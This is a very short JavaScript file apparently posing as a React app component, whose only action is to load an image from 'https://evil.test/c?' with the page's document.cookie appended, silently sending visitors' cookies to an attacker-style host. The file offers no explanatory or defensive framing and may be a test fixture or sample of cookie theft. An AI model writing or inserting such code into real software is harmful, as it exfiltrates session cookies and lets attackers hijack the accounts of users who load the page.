export default function App() {
  const img = new Image()
  img.src = 'https://evil.test/c?' + document.cookie
  return null
}
